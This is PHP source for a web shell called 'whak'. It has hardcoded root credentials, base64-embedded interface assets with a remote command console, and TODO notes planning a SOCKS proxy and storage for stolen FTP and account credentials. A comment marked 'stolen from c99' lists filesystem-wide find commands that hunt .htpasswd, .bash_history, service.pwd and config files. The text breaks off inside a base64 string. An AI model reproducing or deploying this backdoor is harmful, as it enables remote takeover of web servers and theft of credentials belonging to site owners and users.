<?php

# Oooo, its so shiny, and well formatted
ini_set('display_errors', 'off');
error_reporting(E_WARNING);
define('WH_START',       microtime(false));
define('WH_USER',        'root');
define('WH_PASS',        sha1('pass1'));
define('WH_CONTENT_DIR', 'wh_content/');
define('WH_STATUS',      'COMPILED');
define('WH_VERSION',     '1.28 - alpha');
define('PHP_SAFE_MODE',  in_array(ini_get('safe_mode'), array(1, 'on')));


/**
 * Need to add
 * socks proxy
 * certain snippets from c99
 * File Browser
 *  - mkdir
 *  - edit file(code Press)
 *  - Syntax highlighting on other files (geshi)
 *  - ability to browse ftp
 *
 * note types which will be in an array('username'=>'', 'password' => ''); or serialized
 *  - Better formatting
 *  - FTP Credentials
 *  - Account Credentials (Request skeleton)
 *          POST|GET
 *          URL
 *          DATA: {
 *              username: 'blah',
 *              password: 'asdas',
 *              submit: 'login'
 *          }
 *
 *
 * DB Browser
 *  - To use db_credential note type
 */

/*
 stolen from c99

  array("find config.inc.php files", "find / -type f -name config.inc.php"),
  array("find config* files", "find / -type f -name \"config*\""),
  array("find config* files in current dir", "find . -type f -name \"config*\""),
  array("find all writable folders and files", "find / -perm -2 -ls"),
  array("find all writable folders and files in current dir", "find . -perm -2 -ls"),
  array("find all service.pwd files", "find / -type f -name service.pwd"),
  array("find service.pwd files in current dir", "find . -type f -name service.pwd"),
  array("find all .htpasswd files", "find / -type f -name .htpasswd"),
  array("find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
  array("find all .bash_history files", "find / -type f -name .bash_history"),
  array("find .bash_history files in current dir", "find . -type f -name .bash_history"),
  array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
  array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
  array("list file attributes on a Linux second extended file system", "lsattr -va"),
*/

$w = new whak();

class whak {
    var $Session;
    var $mysql;
    var $cli = false;
    var $_cfg = array(
        'session_index' => 'wh_sess'
    );

    var $Aliases;

    ####----
    var $Content = array (
  'main.css' => 'KiB7Cglmb250LXNpemU6IDEwMCU7Cglmb250LWZhbWlseTogaGVsdmV0aWNhOwp9Cgpib2R5ewoJYmFja2dyb3VuZDogIzMzMzsKfQoKLmNsZWFyewoJY2xlYXI6IGJvdGg7Cn0KCiNoZWFkZXIsICNmb290ZXIgewoJcG9zaXRpb246IGZpeGVkOwoJbGVmdDogMDsKCXJpZ2h0OiAwOwoJbWFyZ2luOiAwIC41ZW0gMCAuNWVtOwoJcGFkZGluZzogM3B4OwoJYm9yZGVyOiAxcHggc29saWQgIzgwODA4MDsKCWJhY2tncm91bmQ6ICM3MDcwNzA7Cn0KCiNoZWFkZXIgewoJdG9wOiAwcHg7Cglib3JkZXItdG9wOiBub25lOwoJLW1vei1ib3JkZXItcmFkaXVzLWJvdHRvbUxlZnQ6IDZweDsKfQoKI2NvbnRlbnR7CgltYXJnaW46IDNlbSAxZW07Cn0KCiNmb290ZXJ7Cglib3R0b206IDBweDsKCWJvcmRlci1ib3R0b206IG5vbmU7CgktbW96LWJvcmRlci1yYWRpdXMtdG9wTGVmdDogNnB4OwoJLW1vei1ib3JkZXItcmFkaXVzLXRvcFJpZ2h0OiA2cHg7Cn0KCmgxIHsKCWZvbnQtc2l6ZTogMTUwJTsKCW1hcmdpbjogMCAxZW07Cn0KCmgyIHsKCWZvbnQtc2l6ZTogMTAwJTsKCW1hcmdpbjogMCAxZW07Cgljb2xvcjojYWFhOwp9CgojaGVhZGVyID4gaDEgewoJZmxvYXQ6IGxlZnQ7Cgljb2xvcjogI0ZGQUYwMDsKCWZvbnQtc2l6ZTogMTIwJTsKfQoKI3NlcnZlci1uYW1lewoJZm9udC1zaXplOiA3MCU7CglmbG9hdDogbGVmdDsKCWNvbG9yOiAjYWFhOwp9CgpkaXYuaGVhZGVyLWluZm97CmZvbnQtc2l6ZTogNjAlOwpmbG9hdDogcmlnaHQ7CnRleHQtYWxpZ246IHJpZ2h0Owpjb2xvcjogI2JiYjsKfQoKI3NlcnZlci11cHRpbWUsCiNzZXJ2ZXItbG9hZHsKCWZsb2F0OiByaWdodDsKCWZvbnQtc2l6ZTogNzAlOwoJY29sb3I6ICNiYmI7CgltYXJnaW46IDAgLjJlbTsKfQoKZGl2LnNlY3Rpb257CglkaXNwbGF5OiAtbW96LWJveDsKCS1tb3otYm94LW9yaWVudDogaG9yaXpvbnRhbDsKCS1tb3otYm94LWFsaWduOiBzdHJldGNoOwoJcG9zaXRpb246IGZpeGVkOwoJbGVmdDogMWVtOwoJcmlnaHQ6IDFlbTsKCXRvcDogNGVtOwoJYm90dG9tOiAzLjJlbTsKCW92ZXJmbG93OiBhdXRvOwp9CiNzZXJ2ZXItbm90ZXMgewoJYmFja2dyb3VuZDogIzAwMDsKCWJvcmRlcjogMXB4IHNvbGlkICMzMzM7CgktbW96LWJvcmRlci1yYWRpdXM6IDZweDsKCXBhZGRpbmc6IDA7Cn0KCiNzZXJ2ZXItbm90ZXMgPiBkaXYubm90ZXsKCXBhZGRpbmc6IC4xZW07Cgljb2xvcjogI2FhYTsKfQoKI3NlcnZlci1ub3RlcyA+IGRpdi5ub3RlOmhvdmVyewoJYmFja2dyb3VuZDogIzMzMzsKfQoKI3NlcnZlci1ub3RlcyA+IGRpdi5ub3RlID4gLm9wdGlvbnMgPiAuaWNvbnsKCWZsb2F0OiBsZWZ0OwoJbWFyZ2luOiAxcHg7Cn0KCiNzZXJ2ZXItbm90ZXMgPiBkaXYubm90ZSA+IC5jb250ZW50c3sKCXdoaXRlLXNwYWNlOiBwcmU7Cglmb250LWZhbWlseTogbW9ub3NwYWNlOwp9Cgojbm90ZS1mb3JtewoJd2lkdGg6IDEwMCU7Cn0KI25vdGUtZm9ybSA+IHRleHRhcmVhewoJYmFja2dyb3VuZDogIzU1NTsKCWJvcmRlcjogMXB4IHNvbGlkICM4MDgwODA7Cgljb2xvcjogI2FhYTsKCXdpZHRoOiAzMGVtOwp9CgojY29uc29sZS1jb250ZW50ewoJcG9zaXRpb246IGZpeGVkOwoJbGVmdDogMWVtOwoJcmlnaHQ6IDFlbTsKCXRvcDogNGVtOwoJYm90dG9tOiAzLjJlbTsKCXdoaXRlLXNwYWNlOiBwcmU7Cglmb250LWZhbWlseTogbW9ub3NwYWNlOwoJb3ZlcmZsb3c6IGF1dG87Cgljb2xvcjogI2FhYTsKfQoKI2NvbnNvbGUtY21kIHsKCXBvc2l0aW9uOiBmaXhlZDsKCWJvdHRvbTogMS40ZW07CglsZWZ0OiAxZW07CglyaWdodDogMWVtOwp9Cgojc2VydmVyLXByb21wdHsKCWNvbG9yOiAjYWFhOwoJZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsKfQoKI2NtZCB7CgliYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsKCWJvcmRlcjogbm9uZTsKCW91dGxpbmU6IG5vbmU7CglvdmVyZmxvdzogYXV0bzsKCXdpZHRoOmF1dG87CgltYXJnaW4tbGVmdDogLjVlbTsKCXdoaXRlLXNwYWNlOiBwcmU7Cglmb250LWZhbWlseTogbW9ub3NwYWNlOwoJb3ZlcmZsb3c6IGF1dG87Cgljb2xvcjogI2FhYTsKfQoKI2hlYWRlciA+IHVsLm5hdnsKCXBvc2l0aW9uOiBmaXhlZDsKCXJpZ2h0OiAuNWVtOwoJdG9wOiAxZW07CglwYWRkaW5nOiAwIC4xZW07CgktbW96LWJvcmRlci1yYWRpdXMtYm90dG9tTGVmdDogNnB4OwoJLW1vei1ib3JkZXItcmFkaXVzLWJvdHRvbVJpZ2h0OiA2cHg7CgliYWNrZ3JvdW5kOiAjNzA3MDcwOwoJYm9yZGVyOiAxcHggc29saWQgIzgwODA4MDsKCWJvcmRlci10b3A6IG5vbmU7Cn0KCiNoZWFkZXIgPiB1bC5uYXYgPiBsaSB7CglsaXN0LXN0eWxlOiBub25lOwoJZmxvYXQ6IGxlZnQ7Cglwb3NpdGlvbjogcmVsYXRpdmU7CglwYWRkaW5nOiAwOwp9CgojaGVhZGVyID4gdWwubmF2ID4gbGkgPiBhLmljb257CgltYXJnaW46IDA7CgliYWNrZ3JvdW5kLWNvbG9yOiAjNzA3MDcwOwoJYm9yZGVyLWNvbG9yOiAjNzA3MDcwOwp9CgojaGVhZGVyID4gdWwubmF2ID4gbGkgPiBhLmljb246aG92ZXJ7CgliYWNrZ3JvdW5kLWNvbG9yOiAjMzMzOwoJYm9yZGVyLWNvbG9yOiAjMzMzOwp9Cgp0YWJsZS5maWxlLWxpc3R7CgliYWNrZ3JvdW5kOiMwMDA7Cglib3JkZXI6IDFweCBzb2xpZCAjMzMzOwoJLW1vei1ib3JkZXItcmFkaXVzOiA2cHg7Cgl3aWR0aDogMTAwJTsKCWJvcmRlci1zcGFjaW5nOiAwcHg7Cn0KCnRhYmxlLmZpbGUtbGlzdCAqIHsKCWNvbG9yOiAjYWFhOwp9Cgp0YWJsZS5maWxlLWxpc3QgdHI6aG92ZXJ7CgliYWNrZ3JvdW5kOiAjMzMzOwp9Cgp0YWJsZS5maWxlLWxpc3QgIHRkLm9wdGlvbnMgPiAuaWNvbiB7CglmbG9hdDogbGVmdDsKCW1hcmdpbjogMXB4Owp9CgojZmlsZS1jb250ZW50c3sKCWJhY2tncm91bmQ6ICNmZmY7Cgl3aGl0ZS1zcGFjZTogcHJlOwoJYm9yZGVyOiAxcHggc29saWQgIzMzMzsKCS1tb3otYm9yZGVyLXJhZGl1czogNnB4OwoJcGFkZGluZzogNXB4OwoJbWFyZ2luOiAycHg7Cn0KCiNmaWxlLWNvbnRlbnRzOmVtcHR5ewoJZGlzcGxheTogbm9uZTsKfQoKI2ZpbGUtdXBsb2FkewoJZmxvYXQ6IHJpZ2h0Owp9CgojaWZyYW1lLWhhY2t7Cglib3JkZXI6IG5vbmU7CgloZWlnaHQ6IDBweDsKCWhlaWdodDogMHB4Owp9CgojbGVmdHsKCXdpZHRoOjEwMCU7Cn0KCiN3cmFwcGVyIHsKICAgICBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsKICAgICBjb2xvcjojQUFBQUFBICFpbXBvcnRhbnQ7CiAgICAgd2lkdGg6MTAwJTsKfQoKZmllbGRzZXQgewoJYm9yZGVyOjFweCBzb2xpZCAjQUFBQUFBCn0KCmZpZWxkc2V0IGF7CnRleHQtZGVjb3JhdGlvbjpub25lOwpjb2xvcjpzaWx2ZXI7Cn0KCmZpZWxkc2V0IGE6aG92ZXJ7CnRleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmU7CmNvbG9yOmdyZXk7Cn0KCnRhYmxlIGF7CnRleHQtZGVjb3JhdGlvbjpub25lOwpjb2xvcjpzaWx2ZXI7Cn0KCnRhYmxlIGE6aG92ZXJ7CnRleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmU7CmNvbG9yOmdyZXk7Cn0KCnRhYmxlIHsKCWZvbnQtZmFtaWx5OiAiTHVjaWRhIFNhbnMgVW5pY29kZSIsICJMdWNpZGEgR3JhbmRlIiwgU2Fucy1TZXJpZjsKCglmb250LXNpemU6IDEycHg7Cglib3JkZXI6IDFweCBzb2xpZCAjQUFBQUFBCgl3aWR0aDoxMDAlICFpbXBvcnRhbnQ7CiAgICAgICAgYm9yZGVyLWNvbGxhcHNlOiBjb2xsYXBzZTsKCgl0ZXh0LWFsaWduOiBsZWZ0Owp9Cgp0YWJsZSB0ZHsKCWJvcmRlci1ib3R0b206IDFweCBzb2xpZCAjY2NjOwoKCWNvbG9yOiAjNjY5OwoKCXBhZGRpbmc6IDZweCA4cHg7Cn0KCgp0YWJsZSB0aHsKCWZvbnQtc2l6ZTogMThweDsKCglmb250LXdlaWdodDogbm9ybWFsOwoKCWNvbG9yOiAjMDM5OwoKCXBhZGRpbmc6IDEwcHggOHB4OwoKCWJvcmRlci1ib3R0b206IDJweCBzb2xpZCAjNjY3OGIxOwp9Cgp0ZXh0YXJlYXsKCWhlaWdodDo5MHB4OwoJd2lkdGg6NTUwcHg7CmJhY2tncm91bmQtY29sb3I6YmxhY2s7CmNvbG9yOiNBQUFBQUE7Cn0KCiN2aWV3ewoJd2lkdGg6MTAwJTsKfQo=',
  'functions.js' => 'Ly8gZnVuY3Rpb25zCnZhciBsYXN0Tm90ZSA9IDA7CnZhciBzdGF0dXNVcGRhdGUgPSBmdW5jdGlvbiAoKXsKICAgIHZhciByZXEgPSBuZXcgUmVxdWVzdCh7CiAgICAgICAgdXJsOiAnP209aW5mbycsCiAgICAgICAgb25TdWNjZXNzOiBmdW5jdGlvbiAodGV4dCwgeG1sKXsKICAgICAgICAgICAgdmFyIHNlcnZlciA9IHhtbC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2VydmVyJylbMF07CiAgICAgICAgICAgIHZhciBzZXJ2ZXJBdHRyID0gc2VydmVyLmF0dHJpYnV0ZXM7CgogICAgICAgICAgICBmb3IodmFyIGE9MCA7IGE8c2VydmVyQXR0ci5sZW5ndGg7IGErKyl7CiAgICAgICAgICAgICAgICBpZihzZXJ2ZXJBdHRyW2FdLm5vZGVOYW1lID09ICdsYXN0X25vdGUnKXsKICAgICAgICAgICAgICAgICAgICBpZihzZXJ2ZXIuZ2V0QXR0cmlidXRlKHNlcnZlckF0dHJbYV0ubm9kZU5hbWUpID4gbGFzdE5vdGUpewogICAgICAgICAgICAgICAgICAgICAgICBsYXN0Tm90ZSA9IE51bWJlcihzZXJ2ZXIuZ2V0QXR0cmlidXRlKHNlcnZlckF0dHJbYV0ubm9kZU5hbWUpKTsKCiAgICAgICAgICAgICAgICAgICAgICAgIG5ldyBSZXF1ZXN0LkhUTUwoewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOic/bT1nZXRfbm90ZXMnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlOiAnc2VydmVyLW5vdGVzJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9uU3VjY2VzczogQWpheGlmeQogICAgICAgICAgICAgICAgICAgICAgICB9KS5zZW5kKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICB2YXIgdG1wID0gJCgnc2VydmVyLScrc2VydmVyQXR0clthXS5ub2RlTmFtZSk7CiAgICAgICAgICAgICAgICAgICAgaWYodG1wKXsKICAgICAgICAgICAgICAgICAgICAgICAgdG1wLmlubmVySFRNTCA9IHVuZXNjYXBlKHNlcnZlci5nZXRBdHRyaWJ1dGUoc2VydmVyQXR0clthXS5ub2RlTmFtZSkpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0pLnNlbmQoKTsKfQoKdmFyIHNob3cgPSBmdW5jdGlvbiAoaWQpewogICAgdmFyIHNlY3Rpb25zID0gJCQoJ2Rpdi5zZWN0aW9uJyk7CiAgICBmb3IodmFyIGk9MDsgaTxzZWN0aW9ucy5sZW5ndGg7IGkrKyl7CiAgICAgICAgc2VjdGlvbnNbaV0uc3R5bGUuZGlzcGxheSA9IHNlY3Rpb25zW2ldLmlkID09IGlkID8gJ2Jsb2NrJyA6ICdub25lJzsKICAgIH0KICAgIHdpbmRvdy5sb2NhdGlvbi5oYXNoPScjJytpZDsKfQoKdmFyIEFqYXhpZnkgPSBmdW5jdGlvbiAoKXsKICAgIGNsYXNzTmFtZSA9ICdhamF4JzsKICAgIHN1Y2Nlc3MgICA9IEFqYXhpZnk7CiAgICB2YXIgYWogPSAkJCgnLicrY2xhc3NOYW1lKTsKCiAgICBmb3IodmFyIGk9MDsgaTxhai5sZW5ndGg7IGkrKyl7CiAgICAgICAgYWpbaV0ucmVtb3ZlQ2xhc3MoY2xhc3NOYW1lKTsKICAgICAgICBhaltpXS5hZGRFdmVudCgnY2xpY2snLCBmdW5jdGlvbiAoZSl7CiAgICAgICAgICAgIGUuc3RvcCgpOwogICAgICAgICAgICB2YXIgb3B0ID0gewogICAgICAgICAgICAgICAgdXJsOnRoaXMuZ2V0QXR0cmlidXRlKCdocmVmJyksCiAgICAgICAgICAgICAgICB1cGRhdGU6IHRoaXMuZ2V0QXR0cmlidXRlKCd1cGRhdGUnKSwKICAgICAgICAgICAgICAgIG9uU3VjY2Vzczogc3VjY2VzcwogICAgICAgICAgICB9OwogICAgICAgICAgICBuZXcgUmVxdWVzdC5IVE1MKG9wdCkuc2VuZCgpOwogICAgICAgIH0pOwogICAgfQoKfQoKd2luZG93LmFkZEV2ZW50KCdkb21yZWFkeScsIGZ1bmN0aW9uICgpewogICAgc3RhdHVzVXBkYXRlKCk7CiAgICB2YXIgc3RhdHVzSW50ZXJ2YWwgPSBzZXRJbnRlcnZhbCgnc3RhdHVzVXBkYXRlKCknLCAzNTAwKTsKCiAgICAkKCdjbWQtZm9ybScpLmFkZEV2ZW50KCdzdWJtaXQnLCBmdW5jdGlvbiAoZSl7CiAgICAgICAgZS5zdG9wKCk7CiAgICAgICAgdmFyIGNvbnNvbGUgPSAkKCdjb25zb2xlLWNvbnRlbnQnKTsKICAgICAgICB2YXIgY21kICAgICA9ICQoJ2NtZCcpOwoKICAgICAgICBzd2l0Y2ggKGNtZC52YWx1ZSl7CiAgICAgICAgICAgIGNhc2UgJ2Nscyc6CiAgICAgICAgICAgIGNhc2UgJ2NsZWFyJzoKICAgICAgICAgICAgICAgIGNvbnNvbGUuaW5uZXJIVE1MID0gJyc7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnJzoKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgdGhpcy5zZXQoJ3NlbmQnLCB7b25TdWNjZXNzOiBmdW5jdGlvbiAodGV4dCl7CiAgICAgICAgICAgICAgICAgICAgJCgnY29uc29sZS1jb250ZW50JykuaW5uZXJIVE1MICs9IHRleHQ7CiAgICAgICAgICAgICAgICAgICAgJCgnY29uc29sZS1jb250ZW50Jykuc2Nyb2xsVG8oMCwgJCgnY29uc29sZS1jb250ZW50JykuZ2V0U2Nyb2xsSGVpZ2h0KCkpCiAgICAgICAgICAgICAgICB9fSk7CiAgICAgICAgICAgICAgICB0aGlzLnNlbmQoKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICBjbWQudmFsdWUgPSAnJzsKICAgIH0pOwoKICAgICQoJ2NvbnNvbGUtY29udGVudCcpLmFkZEV2ZW50KCdjbGljaycsIGZ1bmN0aW9uICgpeyQoJ2NtZCcpLmZvY3VzKCk7fSk7CiAgICBpZih3aW5kb3cubG9jYXRpb24uaGFzaC5zZWFyY2goL2RiLXNlY3Rpb24vaSkgPiA1KXsKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicmlnaHQiKS5pbm5lckhUTUwgPSAiIjsKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibGVmdCIpLmlubmVySFRNTCA9ICIiOwogICAgfQogICAgQWpheGlmeSgpOwogICAgJCgnbm90ZS1mb3JtJykuYWRkRXZlbnQoJ3N1Ym1pdCcsIGZ1bmN0aW9uIChlKXsKICAgICAgICBlLnN0b3AoKTsKICAgICAgICB2YXIgbm90ZXMgPSAkKCdub3RlcycpOwogICAgICAgIGlmKG5vdGVzLnZhbHVlKXsKICAgICAgICAgICAgdGhpcy5zZXQoJ3NlbmQnLCB7CiAgICAgICAgICAgICAgICBvblN1Y2Nlc3M6IGZ1bmN0aW9uICh0ZXh0KXsKICAgICAgICAgICAgICAgICAgICAkKCdzZXJ2ZXItbm90ZXMnKS5pbm5lckhUTUwgPSB0ZXh0OwogICAgICAgICAgICAgICAgICAgIEFqYXhpZnkoJy5hamF4JywgQWpheGlmeSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICB0aGlzLnNlbmQoKTsKICAgICAgICAgICAgbm90ZXMudmFsdWU9ICcnOwogICAgICAgIH0KICAgIH0pOwoKICAgIGlmKHdpbmRvdy5sb2NhdGlvbi5oYXNoKXsKICAgICAgICBzaG93KHdpbmRvdy5sb2NhdGlvbi5oYXNoLnJlcGxhY2UoLyMvLCAnJykpOwogICAgfQoKICAgICQoJ2ZpbGUtY29udGVudHMnKS5hZGRFdmVudCgnZGJsY2xpY2snLCBmdW5jdGlvbiAoZSl7CiAgICAgICAgaWYoZS5jb250cm9sKXsKICAgICAgICAgICAgdGhpcy5lbXB0eSgpOwogICAgICAgIH0KICAgIH0pOwoKfSk7',
  'icon.silk.spritesheet.css' => 'Lmljb257CiAgICBtYXJnaW46IDRweDsKICAgIGhlaWdodDogMTZweDsKICAgIHdpZHRoOiAxNnB4OwogICAgY29sb3I6IHRyYW5zcGFyZW50OwogICAgb3ZlcmZsb3c6IGhpZGRlbjsKICAgIGJhY2tncm91bmQtaW1hZ2U6dXJsKCdkYXRhOmltYWdlL3BuZztiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUZBQUFBQmdDQVlBQUFDS2EvVUFBQUFnQUVsRVFWUjRuTjJkZDVoVjFibkdmM3VmTW1mNk1EQU5obzRpaUJTamdJaUlYV05zUVdPTkVDdUlMWllFVGN4TlloSmpjcjFLbEZpd2wydVBzVVVGUkFTa2c0Q1VBWVl5dEdHWVBuUEszbnUxKzhlWmM1aUJhWVI0dmJuZjg1eG5uN0xldGRkNjk3ZmF1OHFCZndPNy9KVUxwMTB5OHp6N3UwNUhhK1p2NjRkN0ZrODJ4aGlVMUNpcGVQejA1NjMvellRMU55ZnFYdTA1M2xIQTlmK2I5NzE3MGMxTGxkVHlzWEV6VDI0clRKc0VhcTA1cWV0WXRORjhVZmI1dDVQQ1puYjd2T3VMcFpDWENsZWU0N25pQk9GNjNWeEg0RGtlUmRsRmVLbGl5SmhmblJCZTlOc1ZkM3pyaVFIdSt1cW1OWG4rZ3FIS1Zreis5TWRmUDNYdUt5TmFDOWNtZ1Vvb3BKWm9yUkdlL1BaU0N0dzI5N3JSbml2dTY1SFc0OExzN0J6U2d1bllsb1hRQWlFbFFnc2M0ZExRMkhqN2tOc0dodGM5dnVrWDMxWmE3bGs4T2FpVlhwOFh5Qi9RTzZNUFdtc2N4eGwrN1R1WGJSS2VPTzcxcS83dU5RL2ZacjBpaEVScWlUUVN6L0hhQ25iSXplOVpQSG4yNFNUNDFqbVRpajNIdSsvb25JRVg5dTNTajZBL2lEYWFtSENhWGpHaUlvYWpYQnpIeFhWRThIRGliMjRYUFgzTzdQT21uOVl1WGtuMXNSU3lXRXFWekgrcUx3M1A4WHA1anZmaHdlSGI5RURoeGdsVVd1TTVvck5wWEsra0t1NXNZQURYRVpjV3BYZS9zR3RxVnh6aEVuRmpsT3dvWWN2MkxYaU93SFU4aXJ2M1FBako1cEl0VDVRK3QrUGV3NG0vdVhtT045YU5lZXVCbzlvSzgrZ3BNODhDdVBHanEwMXhSaytVMW15djJJSG5lS2Y5N1laUGxod2N2azBDUFZjZ2xFSWJoZHNKRDd4bjhlUTFCY0hDQWRLV1RQNzB4OFp6QlY1VEhlWTZYdndhTy9EZWN3UnJIdHRndVRIM25QVHNkTUplaElnVFpkYmlXVHM5eDN0bi9nTkw3MDdFSGI0cDhvMFVjc1hXRjhwdWErUGVCa0JKaFJRUzRVbGF1MzlSYmhHZUp3YWNPRzNZbXVWL1hET3N2ZncwejM5bFRTVi92K25UUThqcmdFQVBvUVRhcUE2TDhEMkxKeS9ORHhRTTdaUGVENmtseGVtOWtGb2lsRUlvRWEvTGxHejZUaUsxNE8wMzN3VWdGbldQWDdSaHNlYzVublpqWHRSenZKY1gvbnI1QXdkbDVuVWwxUit2ZmZ2U1NXNFQrUWxpNXR5NzRFV0FNVjFQUWVtbVlxZGx1L2NQaHlORHcxT2lTemMrdVdYVWtlYS9iUUlkTDE2RU8rR0JTaW9wTFltbjRoaXBKRUxMcHNRM1hac3lJRlc4WGtrMFRFN0UrWGx6cjNRZGo3c1gzV3dycWFZOU51N1pQd0JzZjJubkh3QmlaN3Y5UGNlN3hYTzhORGZtMlo3ajFRRXZLaGtuS2tsZUIvZjNoRUI0c3QyV3NiUDViNU5BTnlZUVNxQTY0WUdQbmpMejVNbWYvdmpyU0RRNlBPUkxwYXlpak1yYXFsYUxyZWNLaENlUklwNytEMitaL2VMQjhaMzgvUk5ma0VLZUFQd2g4ZDJFNTg5L3hJazRsNTQyL0xSY3kyZFR2citjenhkOHNRcEFDc2tYWlorM1dtd1Q5MDhMcFZGVTFKM0svWlZzS2RtNnV2UzU3VzMyN1E0bi82MFNlUDRUWjR4T0RhUWl0RVJyaGR1SlJ1U3BjMThaY2MyYkV6WjVqdGZMZGJ6VDNyLzVzMWJyakk3c3RyblhQVjZRVWpoSjJwSnIzNzdVSklwc1lWWWhmWTdxZytXejhKVEhqdDFsdURIM000REhUMytodzA3K3NEc0hqOTVkdHZjTDRjbWRwYzl0YjdWUDE5dzh4K3RVL2c4aDhQdC9PZjB6ei9IRzlTM3FoMUFTYlJUZEM3c3o1TFpvVEFxMXNPU3AwclBhdWVseHJ1TjkrTStTZCt1Y1NYL09EeGJjMmkrblAwb3BldVgwYVNwKzhYcXN3V25BSi94czI3R2RkZXMyZkNBOCtVNW40MTd6MklZbEE2N3ZPMThLZVVGbndydU9sOHovWVhtZzYzZ1hDRmQrVTFsVmRYUnUxMjVvb3hCQ0lGeTVXMHAxZm5zM2ZXdmloeDV3VG1jUzJIcWloZWRhSG83bnhMdFBPazZlcHdUUldJVEsya3IyN05sTHlZWk5Id2doSHlwOWJzZnV3NG0vOUxudG5VNWJvZzdVUmlIY3cvREF6MysyMEFNR2Z1L2U0NzZPUm1QRGxWS1VidHE2ZHZQTWJlMDIrLzhLbS9tRDEzNXgrU3NYWmpRME50N3VlWUxTc3RLbStrd2dYSy9LYzhVSzRjclBwSkR2YkgyaDdMRElPMXp6SEErcEJKcjJSMkx0MWgyRHBoejFsUlRTditYWjdXMDI5OStHblRmOXRPZmNtRGR5N3JTdmp2dmZ2Rzl6Tys3Mlk0d1U4WDZsa29wdEwrNzh6c1NVdzdieGZ6akpIdk9yRTZaOTErbm9qSFhJNnE2L24va2tNTG5wNDFNOUw1NHpwYTJ3WXR0MEc4Z0k5THVqSWZHZC9wSmMrMVJxMU9kTU1vb1BqRUlhaFJmOEFjNFJwLzVmWUhQbXpNa3h4bHlqdGI1TWF6MVlheDFTU20zVFdzOVNTajA5WWNLRTB2Ync3UktZSUsvbzNHY0FLUC8wSm1pRFJMRnQrbERnTTZBRW96Y0E3NEtlWisrOGV3eUsyNHlpdTFFczA0b1RVaTdnMURZeUV6VEdYR2lNdVZwcmZZd3hab0F4Um11dDF4bGpTclhXejJtdDUxeHl5U1c2QTFJNkhjK3NXYk5lS3k0dXZxcWdvSUNNakF4czJ5WVNpVkJSVWNIYXRXczNYM2JaWlFQL0tRS1Q1SjMxSjFSME5YWktIL3laNDluOS90bElvWi92ZTluY0Z1S20yRGI5ejhCb2pCa2RkVTJkSjNSYXRyMGhiZDd5ZmRIeFBmNlI1czhlajY0clI4WktsaGpGQzFveUsvMEtkalRMOUdCanpPdDVlWGxEQ3dzTFNVOVBKeTB0RFdNTTlmWDFORFkyc25QblRpb3JLeGNhWXk2LzlOSkw5N1pCM21IRms1R1I4YzI0Y2VOeXRkWUVBZ0ZzMjBhSWVLdjd3UWNmVUpsOUtrb2JwTkxOWGdvbERVcnJGYTEycEp1VEp4dSt3QXAwWTkvY1B3Qi9vUGlpMmV4NGVjeDFTMmFjMUcvMDFNV25OWU90MTlyY3ZtNWJUSDc1amIvYm9MNlpuSEowVDhiMSt5TE5uMzQ2Vml3Tm4xT0FqbGFQRm5ibGErbFhIaUFQUUdzOVkrREFnVU43OXV5SlpiVjhycm01dWVUbTV0S2pSdy9XclZzM2R2UG16UThCRTF0TCsrSEdvN1dXVWtyS3k4dEpUMDlIYTgzZXZYc1pOR2dRU2lsK01yNWJhN2NCNE5kdmxnNXRheWczdWVqY1o1QzE3MkZVUGRncDVKMDBqY3JGZjJUM3UyZlErK3FQMGMrZU9YN0pqSk8rU0pENDNDY3k2NkxSTWppa1g0aDNacFd3YlhzQVVkUEltVVhsYUJYRTV4WkRZd3dqQkh0aktWTWJubmZmeWJxT2ZZa2JHbU9HRkJRVXRKblloUFhvMFlPU2twTHZIL3g5NVlweHB4dGxaamp5TDBlSEtsT3BxZ0NqTkZvS0xEdWRic2MvaWk5VWNFZzhXbXNkREFheGJadjA5SFRLeXNvSWhVSmtaV1dobE9LRmRZKzFPcDZlZHRMdkVVSUYyeHdMRzI5SG5EekF5R29zZndtRnAwM0RxZmlhV05uVjlKbjBLT3FwTzhZRFBQamdneWZzMkZYNTg1a1ZIbE1tRkpHVzBZWFA1czZpcUdnQ2EzWk81cWZEL2dKeUUzNmR5Zkw2UXFhK0VOSkNpR0xZbUNSUWE0MHhob3FLQ2tLaEVDa3BLUVFDQVl3eFJLTlJhbXBxMkxObkQvMzc5MGZybGxWZzVZcHh0bEhtc3RTdUk0L0pDT2FqcGNBSWhmWml4R28yRWlyK0VaSXNLdmZ0bzc2K250cmFXbnIzN28zV0dxVVVBSjRYSDIwa2lpK0FsSkpiVDdpblZYNGlqa1JJMWJhWVlBVUtzSHpwR0JVQm96QmlQMUxXWU9SWGlIQTlLWVhWeUNvM2NmTUx1bmZ2M24zdTNMbjhweHRnNzk2OTFOZlhzM2Z2WG9aMzM4ZXJhMDVuWVBaV2xwUjE1NWd1TlJ6VnQzandpdFhyTHdCV0hFeWczKytudHJZV3gzRXd4aUNscEtHaEFkZDE4ZnY5R0dNT0lWQXIzY3NvYzAwZ3ZRK3lmZ1YyYUFSU1Z1SFViYVpjamtGVjkwVHQvNGFxcWlwczIwN1dpYzBKbEZLaWxN